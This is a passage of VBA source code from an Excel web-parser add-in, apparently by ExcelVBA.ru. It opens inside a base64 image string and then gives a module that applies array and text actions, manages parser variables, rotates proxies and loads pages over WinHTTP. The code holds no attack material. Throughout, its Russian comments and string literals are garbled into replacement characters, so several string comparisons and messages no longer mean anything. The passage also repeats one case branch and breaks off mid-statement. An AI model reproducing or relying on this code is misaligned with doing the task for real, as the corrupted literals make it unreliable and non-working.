           "rETFH/GIg/SowPz41QsCk4ihcFJLPLTkVMiBxDvxmJDOzRjobtwL0gPen4AGTIdh3eQDZ2OoRnNIAOol65DwwGEb0LF9NDVAwAQZqIGOlJmMgAAAABJRU5ErkJggg==') 4px 4px no-repeat;margin: 0;    padding: 0 0 0 28px;border: none;}" & vbNewLine

    res$ = res$ & ".info {background: url('data:image;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAKTWlDQ1BQaG90b3Nob3AgSUNDIHByb2ZpbGUAAHjanVN3WJP3Fj7f92UPVkLY8LGXbIEAIiOsCMgQWaIQkgBhhBASQMWFiApWFBURnEhVxILVCkidiOKgKLhnQYqIWotVXDjuH9yntX167+3t+9f7vOec5/zOec8PgBESJpHmomoAOVKFPDrYH49PSMTJvYA" & _
           "CFUjgBCAQ5svCZwXFAADwA3l4fnSwP/wBr28AAgBw1S4kEsfh/4O6UCZXACCRAOAiEucLAZBSAMguVMgUAMgYALBTs2QKAJQAAGx5fEIiAKoNAOz0ST4FANipk9wXANiiHKkIAI0BAJkoRyQCQLsAYFWBUiwCwMIAoKxAIi4EwK4BgFm2MkcCgL0FAHaOWJAPQGAAgJlCLMwAIDgCAEMeE80DIEwDoDDSv+CpX3CFuEgBAMDLlc2XS9IzFLiV0Bp38vDg4iHiwmyxQmEXKRBmCeQinJebIxNI" & _
           "5wNMzgwAABr50cH+OD+Q5+bk4eZm52zv9MWi/mvwbyI+IfHf/ryMAgQAEE7P79pf5eXWA3DHAbB1v2upWwDaVgBo3/ldM9sJoFoK0Hr5i3k4/EAenqFQyDwdHAoLC+0lYqG9MOOLPv8z4W/gi372/EAe/tt68ABxmkCZrcCjg/1xYW52rlKO58sEQjFu9+cj/seFf/2OKdHiNLFcLBWK8ViJuFAiTcd5uVKRRCHJleIS6X8y8R+W/QmTdw0ArIZPwE62B7XLbMB+7gECiw5Y0nYAQH7zLYwaC"

    GetBalloonTemplate1 = res
End Function





Attribute VB_Name = "mod_AACTIONS"
'---------------------------------------------------------------------------------------
' Module        : mod_AACTIONS
' Author        : EducatedFool                     Date: 02.07.2014
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/                     Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit: Option Compare Text: Option Private Module

Function REGEXP()
    On Error Resume Next
    Static REGEXP_ As Object
    If REGEXP_ Is Nothing Then Set REGEXP_ = CreateObject("VBScript.RegExp"): REGEXP_.Global = True
    Set REGEXP = REGEXP_
End Function

Function All_AAs(Optional ByVal Reload As Boolean = False) As ArrayActions
    Static AAs_ As ArrayActions
    If Reload Or (AAs_ Is Nothing) Then
        Set AAs_ = New ArrayActions
        AAs_.InitializeAllArrayActions
    End If
    Set All_AAs = AAs_
End Function

Function GetClipboard_AAs() As ArrayActions
    On Error Resume Next
    Set GetClipboard_AAs = New ArrayActions
    GetClipboard_AAs.ReadClipboard
End Function

Function ApplyArrayActionToText(ByRef txt$, ByRef AA_codename$, _
        Optional ByRef parameters As Dictionary, _
        Optional WP As WebsiteParser) As Long
    On Error Resume Next
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| TXT |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| AA_codename$
    ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| TXT
    If StopMacro Then Exit Function
    
    Dim arr, i&, j&, res$, tmp_txt$, cnt&
    txt = Replace(txt, TEMP_ARSEP$, ARSEP$)
    If txt = "" Then arr = Array("") Else arr = Split(txt, ARSEP)
    cnt& = Val(Trim(parameters("Count")))
    
    Select Case AA_codename$
        Case "": Exit Function
            
        Case "ArrayItemsCount"
            If txt = "" Then i& = 0 Else i& = UBound(arr) + 1
            If Len(Trim(parameters("VarName"))) Then ParserVariables.item("%" & CStr(Trim(parameters("VarName"))) & "%") = i&
            If Not (parameters("Output") Like "|fffd||fffd||fffd|") Then txt$ = i&
            Exit Function
            
        Case "FirstArrayItems"
            For i = cnt& To UBound(arr)
                arr(i) = ""
            Next i
            
        Case "GroupArray"
            If cnt& > 1 Then
                For i = LBound(arr) To UBound(arr)
                    If (i + 1) Mod cnt& > 0 Then arr(i) = arr(i) & TEMP_ARSEP$
                Next i
                txt = Join(arr, ARSEP)
                txt = Replace(txt, TEMP_ARSEP$ & ARSEP$, TEMP_ARSEP$)
                RemoveExtraSeparators txt, TEMP_ARSEP$
                Exit Function
            End If
            
        Case "SelectItems"
            
            Dim DefaultMode&, AvailableMode&, DefSelection$, vKey As VirtualKeys
            If Len(parameters("IfKeyPressed")) Then
                Select Case parameters("IfKeyPressed")
                    Case "Ctrl": vKey = VK_CONTROL
                    Case "Shift": vKey = VK_SHIFT
                End Select
                If vKey Then If Not KeyPressed(vKey) Then Exit Function
            End If
            
            DefaultMode& = Val(Split(Trim(parameters("DefaultMode")))(0))
            AvailableMode& = so_All
            If parameters("AvailableMode") = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" Then AvailableMode& = so_None
            DefSelection$ = Split(Trim(parameters("DefaultSelection")))(0)
            
            arr = UserChoiseFromArray(arr, DefaultMode&, AvailableMode&, Trim(parameters("Column")), DefSelection$, parameters("Caption"))
            If Not IsArray(arr) Then If arr = "" Then ApplyArrayActionToText = -9
            
        Case "LastArrayItems"
            For i = 0 To UBound(arr) - cnt&
                arr(i) = ""
            Next i
            
        Case "SelectedArrayItems"
            Dim FirstIndex&
            FirstIndex& = Val(Trim(parameters("FirstIndex")))
            For i = 0 To FirstIndex& - 2
                arr(i) = ""
            Next i
            If cnt& Then
                For i = cnt& + FirstIndex& - 1 To UBound(arr)
                    arr(i) = ""
                Next i
            End If
            
        Case "CropLastArrayItems"
            For i = UBound(arr) - cnt& + 1 To UBound(arr)
                arr(i) = ""
            Next i
            
        Case "SeparateArray"
            j = -1 ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            
            tmp_txt$ = parameters("Mask")
            For i = 0 To UBound(arr)
                If arr(i) Like tmp_txt$ Then j = i: Exit For
            Next i
            If j = -1 Then Exit Function
            
            Dim min&, max&
            Select Case Val(parameters("Action"))
                Case 1 ' |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    min& = 0: max& = j - 1
                Case 2 ' |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd|
                    min& = 0: max& = j
                Case 3 ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd|
                    min& = j: max& = UBound(arr)
                Case 4 ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    min& = j + 1: max& = UBound(arr)
            End Select
            
            For i = min& To max&
                arr(i) = ""
            Next i
            
        Case "GetJSONArray"
            For i = 0 To UBound(arr)
                arr(i) = Get_JSON_Array(arr(i))
            Next i
            
        Case "RemoveDuplicates"
            Dim coll As New Collection
            For i = LBound(arr) To UBound(arr)
                Err.Clear: coll.Add 1, CStr(LCase(arr(i)))
                If Err Then arr(i) = ""
            Next i
            
        Case "LastArrayItems"
            For i = 0 To UBound(arr) - cnt&
                arr(i) = ""
            Next i
            
        Case "ReverseArray"
            Dim tmpArr: tmpArr = arr
            For i = LBound(arr) To UBound(arr)
                arr(i) = tmpArr(UBound(arr) + LBound(arr) - i)
            Next i
            tmpArr = ""
            
        Case "SplitToArray"
            'txt = Replace(txt, Parameters("Delimiter"), TEMP_ARSEP$)
            txt = Replace(txt, parameters("Delimiter"), ARSEP$)
            RemoveExtraSeparators txt
            Exit Function
            
        Case "ContinueWithArray"
            txt = Join(arr, TEMP_ARSEP$)
            Exit Function
            
        Case "JoinArrayItems"
            txt = Join(arr, parameters("Delimiter"))
            Exit Function
            
        Case "AddItemIntoArray"
            RemoveExtraSeparators txt
            If Len(parameters("Value")) Then
                Select Case parameters("Position")
                    Case "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd|": txt = parameters("Value") & ARSEP & txt
                    Case "|fffd| |fffd||fffd||fffd||fffd||fffd|": txt = txt & ARSEP & parameters("Value")
                End Select
            End If
            RemoveExtraSeparators txt
            Exit Function
            
        Case "ArrayOfNumbers"
            Dim vMin&, vMax&, vStep&, vDiv&, restxt$        ', SB As New cStringBuilder
            vMin& = Val(parameters("Minimum"))
            vMax& = Val(parameters("Maximum"))
            If parameters("Maximum") = "" Then vMax& = Val(txt)
            vStep& = Val(parameters("Step"))
            vDiv& = Val(parameters("Divider"))
            
            If vStep& = 0 Then vStep& = 1
            If vDiv& = 0 Then vDiv& = 1
            vMax& = Application.WorksheetFunction.RoundUp(vMax& / vDiv&, 0)
            
            For i = vMin& To vMax& Step vStep&
                restxt$ = restxt$ & ARSEP & CStr(i)
            Next
            
            txt = Mid$(restxt$, Len(ARSEP) + 1)
            Exit Function
            
        Case "SortArray"
            If UBound(arr) > 0 Then SortArray arr, IIf(parameters("SortOrder") Like "*|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|*", xlDescending, xlAscending), _
                parameters("SortType") Like "*|fffd||fffd||fffd||fffd||fffd|*", Val(parameters("Column"))
            
        Case "RemoveParentURLs"
            For i = LBound(arr) To UBound(arr)
                For j = LBound(arr) To UBound(arr)
                    If (i <> j) And (Len(arr(j)) > 0) Then
                        If InStr(1, arr(j), arr(i), vbTextCompare) = 1 Then
                            res$ = "": res$ = Mid(arr(j), Len(arr(i)) + 1)
                            If res$ Like IIf(Right(arr(i), 1) = "/", "", "/") & "?*" Then arr(i) = "": Exit For
                        End If
                    End If
                Next j
            Next i
            
        Case "MergeHeaderWithEveryRow"
            Dim headerArr As Variant, DataRow$, DataValue$
            If UBound(arr) > 0 Then
                headerArr = Split(arr(0), "|")
                For i = 1 To UBound(arr)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
                    DataRow$ = ""
                    For j = LBound(headerArr) To UBound(headerArr)
                        DataValue$ = "": DataValue$ = Split(arr(i), "|")(j)
                        DataRow$ = DataRow$ & IIf(DataRow$ = "", "", "|") & headerArr(j) & parameters("Delimiter") & DataValue$
                    Next j
                    res = res & IIf(res = "", "", ARSEP) & DataRow$
                Next i
            End If
            txt = res
            Exit Function
            
        Case "JoinedArray"
            arr = JoinedArrayEx(arr, parameters("ComparedColumn"), parameters("ColumnsToSum"), parameters("ColumnsToJoin"), parameters("JoinSeparator"))
            
    End Select
    
    txt = Join(arr, ARSEP)
    RemoveExtraSeparators txt
End Function


Function ApplyNormalActionToText(ByRef txt_before$, ByRef AA_codename$, _
        Optional ByRef parameters As Dictionary, _
        Optional ByRef WP As WebsiteParser) As Long
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| txt_before$  |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| AA_codename$
    ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| txt_before$
    If StopMacro Then Exit Function
    
    Dim txt$, arri&, i&, ind&, n&, tmp_txt$, res$, n2&, wc&, l$, v, NN#, nn1#, nn2#, arr, URL$, param$, LastIndex&, dic_key
    Dim MatchesPattern As Boolean, CheckMode As Boolean, ReturnValue As Boolean, ASet_name$, ASet As ActionSet
    Dim ParserName$, AllWPs As WebsiteParsers, WPtoRun As WebsiteParser
    Dim col&, sh As Worksheet, cell As Range, sheetName$
    
    Static ValuesList_SourceText$, ValuesList$, PostData$
    On Error Resume Next: Err.Clear
    
    Select Case AA_codename$
        Case "SetVariable"
            res$ = "%" & CStr(parameters("Name")) & "%"
            Select Case parameters("RefersTo")
                Case "row": RowVariables.item(res$) = txt_before$
                Case "parser": ParserVariables.item(res$) = txt_before$
            End Select
            Exit Function
            
        Case "ShowVariablesDialog"
            If Not ShowVariablesDialog(parameters("VariableNameList")) Then ApplyNormalActionToText = -9
            Exit Function
            
        Case "GetVariable"
            txt_before$ = parameters("Default")
            res$ = "%" & CStr(parameters("Name")) & "%"
            
            Select Case parameters("RefersTo")
                Case "row": If RowVariables.Exists(res$) Then txt_before$ = RowVariables.item(res$)
                Case "parser": If ParserVariables.Exists(res$) Then txt_before$ = ParserVariables.item(res$)
            End Select
            Exit Function
            
        Case "ClearVariable"
            res$ = "%" & CStr(parameters("Name")) & "%"
            Select Case parameters("RefersTo")
                Case "row": If RowVariables.Exists(res$) Then RowVariables.Remove res$
                Case "parser": If ParserVariables.Exists(res$) Then ParserVariables.Remove res$
            End Select
            
        Case "SetValue"
            res$ = parameters("Value")
            If Len(Trim(parameters("VarName"))) Then ParserVariables.item("%" & CStr(Trim(parameters("VarName"))) & "%") = res$
            If Not (parameters("Output") Like "|fffd||fffd||fffd|") Then txt_before$ = res$
            Exit Function
            
        Case "ProgressIndicator_SNA"
            n2& = Fix(Val(parameters("Multiplier")))
            If n2& <= 0 Then n2& = 1
            If n2& >= 50 Then n2& = 1
            n& = n2& * Val(parameters("Count"))
            
            If n& = 0 Then If txt_before$ <> "" Then n& = UBound(Split(txt_before$, ARSEP)) + 1
            WP.PrInd1.StartNewAction 1, , , , , n&
            
            n& = Val(parameters("Move")): If n Then WP.PrInd1.Move n&
            Exit Function
            
        Case "NumericArrayFunction"
            If txt_before$ Like "*#*" Then
                arr = Split(txt_before$, ARSEP)
                ReDim narr(LBound(arr) To UBound(arr)) As Double
                For i = LBound(arr) To UBound(arr)
                    narr(i) = Val(Replace(arr(i), ",", "."))
                Next i
                
                Select Case parameters("Function")
                    Case "Min": txt_before$ = Application.min(narr)
                    Case "Max": txt_before$ = Application.max(narr)
                    Case "Average": txt_before$ = Application.Average(narr)
                    Case "Median": txt_before$ = Application.Median(narr)
                End Select
                Erase narr
            End If
            Exit Function
            
        Case "VLookup"
            Dim sv$, rv$, col1&, col2&, ColumnsAfter As Boolean
            ColumnsAfter = InStr(1, parameters("ReturnedColumn"), "+") > 0
            col1& = Val(Trim(parameters("CheckColumn")))
            col2& = Val(Trim(parameters("ReturnedColumn")))
            If col1& = 0 Then txt_before$ = "": Exit Function
            
            If txt_before$ Like "*|*" Then
                arr = Split(txt_before$, ARSEP)
                For i = LBound(arr) To UBound(arr)
                    If arr(i) Like "*|*" Then
                        sv$ = "": rv$ = "": v = "": v = Split(arr(i), "|", IIf(ColumnsAfter And (col2& > 0), col2&, -1))
                        sv$ = v(col1& - 1)
                        If sv$ Like parameters("Mask") Then
                            If col2& Then rv$ = v(col2& - 1) Else rv$ = arr(i)
                            res = res & IIf(res = "", "", ARSEP) & rv$
                        End If
                    End If
                Next i
                
                If parameters("Index") <> "|fffd||fffd||fffd|" Then
                    LastIndex& = 999: If InStr(1, parameters("Index"), "last", vbTextCompare) > 0 Then LastIndex& = Val(Split(parameters("Index"), "last")(1))
                    If LastIndex& <> 999 Then
                        ind& = UBound(Split(res, ARSEP))
                        If ind& Then res = Split(res, ARSEP)(ind& + LastIndex&) Else res = ""
                    Else
                        ind& = Val(Trim(parameters("Index"))): Err.Clear: res = Split(res, ARSEP)(ind& - 1)
                        If Err Then res = ""
                    End If
                End If
            End If
            txt_before$ = res
            Exit Function
            
        Case "HLookup"
            Dim ro1&, ro2&, checkArr As Variant, j&, AddBeforeFromColumn&, extraText$
            ro1& = Val(Trim(parameters("CheckRow")))
            ro2& = Val(Trim(parameters("ReturnedRow")))
            AddBeforeFromColumn& = Val(Trim(parameters("AddBeforeFromColumn")))
            If ro1& = 0 Then txt_before$ = "": Exit Function
            
            If txt_before$ Like "*|*" Then
                arr = Split(txt_before$, ARSEP)
                checkArr = Split(arr(ro1& - 1), "|")
                If IsArray(checkArr) Then
                    For i = LBound(checkArr) To UBound(checkArr)
                        If (checkArr(i) Like parameters("Mask")) Or (checkArr(i) = parameters("Mask")) Then
                            res = ""
                            If ro2& Then
                                res = Split(arr(ro2& - 1), "|")(i)
                                If AddBeforeFromColumn& > 0 Then
                                    extraText$ = "": extraText$ = Split(arr(ro2& - 1), "|")(AddBeforeFromColumn& - 1)
                                    res = extraText$ & "|" & res
                                End If
                            Else
                                For j = ro1& To UBound(arr)
                                    rv$ = "": rv$ = Split(arr(j), "|")(i)
                                    If AddBeforeFromColumn& > 0 Then
                                        extraText$ = "": extraText$ = Split(arr(j), "|")(AddBeforeFromColumn& - 1)
                                        rv$ = extraText$ & "|" & rv$
                                    End If
                                    res = res & IIf(res = "", "", ARSEP) & rv$
                                Next
                            End If
                        End If
                    Next i
                End If
            End If
            txt_before$ = res
            Exit Function
            
        Case "CreateValuesList"
            ValuesList_SourceText$ = txt_before$        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            ValuesList$ = ""        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
            Exit Function
            
        Case "AddItemIntoValuesList"        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            If Len(txt_before$) Then
                If ValuesList$ = "" Then
                    ValuesList$ = txt_before$
                Else
                    ValuesList$ = ValuesList$ & IIf(parameters("Separator") = "", ARSEP, parameters("Separator")) & txt_before$
                End If
            End If
            
            If parameters("AddToVariable") <> "" Then
                ParserVariables.item("%" & parameters("AddToVariable") & "%") = txt_before$
            End If
            
            txt_before$ = ValuesList_SourceText$
            Err.Clear
            Exit Function
            
        Case "GetValuesList"
            txt_before$ = ValuesList$        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            RemoveExtraSeparators txt_before
            ValuesList_SourceText$ = ""        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            Exit Function
            
        Case "LoadHTML_MultiThreading"
            txt_before$ = LoadHTML_MultiThreading(txt_before$, Val(parameters("MaxThreads")), _
                parameters("Encoding"), parameters("Filters"), WP)
            Exit Function
            
        Case "Proxy_GetList_best-proxies.ru"
            txt_before$ = Proxy_GetList_FromBestProxies(parameters("APIkey"), parameters("Limit"), parameters("Type"), _
                parameters("Format"), parameters("Country"), parameters("Level"), _
                parameters("Speed"), parameters("Extra"))
            Exit Function
            
        Case "ProxyCommands"
            arr = Array()
            If Len(Trim(parameters("Parameter"))) Then
                arr = Split(parameters("Parameter"), ARSEP)
            Else
                If Len(txt_before$) Then arr = Split(txt_before$, ARSEP)
            End If
            
            ' ProxyCommandsList = Array("Switch to the next", "Add proxy", "Remove proxy", _
                "Get current", "Get list", "Check current", "Check all", "Get count", "Enable", "Disable")
            
            Select Case parameters("Command")
                
                Case "Enable"
                    With WP.Proxy
                        .Enabled = True
                        .Apply
                    End With
                    res$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
                    
                Case "Disable"
                    With WP.Proxy
                        .Enabled = False
                        .Apply
                    End With
                    res$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
                    
                Case "Switch to the next"
                    With WP.Proxy
                        .SwitchToNext True
                        res$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| # " & .ActiveProxy.Index & " |fffd||fffd| " & .Items.Count & vbNewLine & _
                            "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & .ActiveProxy.Address
                    End With
                    
                Case "Add proxy"
                    For i = LBound(arr) To UBound(arr)
                        If Len(Trim(arr(i))) Then
                            n2& = n2& + 1
                            If Not WP.Proxy.Exists(arr(i)) Then
                                n& = n& - (Not WP.Proxy.Add(arr(i)) Is Nothing)
                            End If
                        End If
                    Next i
                    res$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: " & n& & " |fffd||fffd| " & n2&
                    
                Case "Remove proxy"
                    n2& = WP.Proxy.Items.Count
                    For i = LBound(arr) To UBound(arr)
                        If Len(Trim(arr(i))) Then WP.Proxy.DeleteItemByName arr(i)
                    Next i
                    n& = n2& - WP.Proxy.Items.Count
                    res$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: " & n& & " |fffd||fffd| " & n2&
                    
                Case "Get current"
                    res$ = WP.Proxy.ActiveProxy.Address
                    
                Case "Get list"
                    res$ = Join(WP.Proxy.ArrayOfNames, ARSEP)
                    
                Case "Check current"
                    res$ = IIf(WP.Proxy.ActiveProxy.Check, "ok", "fail")
                    
                Case "Get count"
                    res$ = WP.Proxy.Items.Count
                    
            End Select
            txt_before$ = res$
            Exit Function
            
    End Select
    
    
    If txt_before$ = "" Then
        arr = Array("")
    Else
        arr = Split(txt_before$, ARSEP)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    End If
    
    Dim ParametersCache As New Dictionary
    For Each dic_key In parameters.Keys
        ParametersCache.item(dic_key) = parameters(dic_key)
    Next
    
    For arri = LBound(arr) To UBound(arr)
        txt = Trim(arr(arri))
        
        For Each dic_key In parameters.Keys
            parameters(dic_key) = Replace(ParametersCache(dic_key), "{value}", txt)
        Next
        
        Select Case AA_codename$
            Case "": Exit Function
                
            Case "GetPagerLinks"
                txt = GetPagerLinks(txt, parameters("Filters"), parameters("PagerMask"), parameters("Metrics"))
                
            Case "GetTags"
                txt = GetTags(txt, parameters("TagName"), parameters("AttrName"), parameters("AttrValue"), parameters("Result"))
                
            Case "ConvertTags"
                txt = ConvertTags(txt, parameters("Filter1"), parameters("Result1"), _
                    parameters("Filter2"), parameters("Result2"), parameters("Filter3"), parameters("Result3"))
                
            Case "ReplaceTags"
                txt = ReplaceTags(txt, parameters("Tag"), parameters("ReplaceType"), parameters("ReplacePattern"))
                
            Case "ConvertHTMLtoText"
                txt = ConvertHTMLtoText(txt, parameters("RemoveExtraLF") = "|fffd||fffd|")
                
            Case "RemoveElementsByTagNameAndClassName"
                txt = RemoveElementsByTagNameAndClassName(txt, parameters("TagName"), parameters("ClassName"))
                
            Case "RemoveElementsByTagName"
                txt = RemoveElementsByTagName(txt, parameters("TagName"))
                
            Case "GetElementsByTagNameAndClassName"
                txt = GetElementsByTagNameAndClassName(txt, parameters("TagName"), parameters("ClassName"), parameters("Source"))
                
            Case "GetElementsByTagNameAndName"
                txt = GetElementsByTagNameAndName(txt, parameters("TagName"), parameters("Name"), parameters("Source"))
                
            Case "GetElementsByTagName"
                txt = GetElementsByTagName(txt, parameters("TagName"), parameters("Source"))
                
            Case "GetElementById"
                txt = GetElementById(txt, parameters("ID"), parameters("Source"))
                
            Case "GetAllLinks"
                txt = GetAllLinks(txt, parameters("Mask"), parameters("Prefix"))
                
            Case "GetHyperlinkAndText"
                txt = GetHyperlinkAndText(txt, parameters("Prefix"), parameters("URL_VarName"), parameters("Text_VarName"))
                
            Case "GetAttributeValue"
                txt = HTML_GetAttributeValue(txt, parameters("TagName"), parameters("CheckAttrName"), parameters("CheckAttrValue"), parameters("AttrName"))
                
            Case "HTML_DeleteSpaces"
                txt = HTML_DeleteSpaces(txt)
                
            Case "HTML_DeleteAttributes"
                txt = HTML_DeleteAttributes(txt)
                
            Case "HTML2TXT"
                txt = HTML2TXT(txt)
                
            Case "GetPropertyByItemprop"
                txt = GetPropertyByItemprop(txt, parameters("itemprop"), parameters("TagName"), parameters("Index"))
                
            Case "RemoveExtraChars"
                RemoveExtraSeparators txt, parameters("Value")
                
            Case "GoogleTranslate"
                txt = Translate(txt, parameters("ResultLanguage"), parameters("SourceLanguage"))
                
            Case "GetBreadcrumbs"
                txt = GetBreadcrumbs(txt, parameters("Filters"), Val(parameters("First")), Val(parameters("RemoveLast")))
                
                ' WinHTTP |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            Case "WinHTTP_LoadPageWithCookies"
                If LCase(parameters("NewInstance")) = "|fffd||fffd|" Then CreateNewInstanceOfWinHttpRequest WP
                
                URL$ = IIf(IsURL(Trim(parameters("URL"))), Trim(parameters("URL")), Trim(txt))
                If IsURL(URL$) Then
                    
                    LAST_USED_URL$ = URL$
                    PageLoadRequested URL$
                    ' AddStandartHeadersIntoStore URL$
                    If URL$ Like "*[|fffd|-|fffd||fffd|-|fffd||fffd||fffd|]*" Then URL$ = ConvertURLtoPunycode(URL$)
                    
                    PostData = "": http.Open "GET", URL$, False
                    If WP.Options.UseClientCertificate Then http.SetClientCertificate WP.Options.ClientCertificateName
                    WP.UpdateWinHttpProxySettings ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 3 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 2019
                    
                    Err.Clear
                    AddRequestHeadersFromStore
                    WinHTTP_Send True, WP
                    'If Err Then txt$ = "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|! |fffd||fffd||fffd||fffd||fffd||fffd| " & Err.Number & ": " & Err.Description
                    
                    txt$ = WinHTTP_getResponseText(parameters("Encoding"))
                    If WP.Options.RemoveScripts Then txt = RemoveTags(txt, "script")
                    If WP.Options.RemoveIFrames Then txt = RemoveTags(txt, "iframe")
                    Err.Clear
                    
                Else
                    txt = "|fffd||fffd||fffd||fffd||fffd||fffd|: |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                    If TEST_ACTIONS_MODE Or WP.Options.ShowErrors Then
                        If Len(URL$) Then
                            URL$ = IIf(Len(URL$) > 100, Left(URL$, 35) & " ... " & Right(URL$, 35), URL$)
                            AddBalloon "<b>|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| URL |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|:</b> " & vbNewLine & "<span style='color:red;'>" & URL$ & "</span>" & vbNewLine & _
